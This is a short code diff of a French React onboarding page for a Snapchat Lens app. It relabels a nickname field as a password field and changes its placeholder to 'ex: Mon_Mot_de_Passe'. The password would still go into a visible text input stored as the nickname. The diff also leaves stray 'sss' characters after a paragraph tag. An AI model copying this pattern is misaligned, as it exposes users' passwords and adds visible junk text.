@@ -225,8 +225,8 @@ function OnboardingPageInner() {
               Connecte ta Lens
             </h1>
             <p style={{ fontSize: 13, color: "#6B6B6B", textAlign: "center", marginBottom: 24, lineHeight: 1.5 }}>
-              Indique l&apos;identifiant Snapchat affiche dans la Lens, et choisis un pseudo. On ne te redemandera plus.
-            </p>
+              Indique l&apos;identifiant Snapchat affiche dans la Lens, et choisis un mot de passe. On ne te redemandera plus.
+            </p>sss
 
             <form onSubmit={handleSubmit}>
               <label style={{ fontSize: 11, fontWeight: 700, color: "#8A8A8A", display: "block", marginBottom: 6, textTransform: "uppercase", letterSpacing: "0.06em" }}>
@@ -250,7 +250,7 @@ function OnboardingPageInner() {
                 value={pseudo}
                 onChange={isDemo ? undefined : (e) => setPseudo(e.target.value)}
                 readOnly={isDemo}
-                placeholder="ex: Jeremy"
+                placeholder="ex: Mon_Mot_de_Passe"
                 required
                 style={{ marginBottom: 20 }}
               />
